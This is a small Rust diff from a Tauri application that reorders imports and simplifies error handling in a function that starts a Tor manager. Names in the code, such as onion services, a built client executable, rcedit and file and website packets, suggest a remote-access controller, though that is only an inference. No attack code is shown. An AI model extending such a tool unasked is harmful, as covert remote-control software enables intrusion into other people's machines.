@@ -1,4 +1,7 @@
 use crate::handlers::{AssemblyInfo, SharedTauriState};
+use crate::utils::resources::{get_client_built_exe_path, get_exe_dir, get_rcedit_path};
+use std::process::Command;
+use std::sync::Arc;
 use crate::utils::logger::Log;
 use base64::{engine::general_purpose, Engine as _};
 use serde::Serialize;
@@ -26,9 +29,7 @@ use common::packets::{
     VisitWebsiteData, FileData
 };
 use common::client_info::ClientInfo;
-use crate::utils::resources::{get_rcedit_path, get_client_built_exe_path, get_exe_dir};
 
-use std::process::Command;
 use crate::utils::tor::{TorManager, OnionServiceInfo};
 
 pub async fn get_channel_tx(
@@ -1035,7 +1036,7 @@ pub async fn init_tor(
     }
 
     // Slow path
-    let exe_dir = get_exe_dir().map_err(|e| e.to_string())?;
+    let exe_dir = get_exe_dir()?;
     let tor_dir = exe_dir.join("tor_data");
     let manager = Arc::new(TorManager::new(tor_dir).await.map_err(|e| e.to_string())?);
 
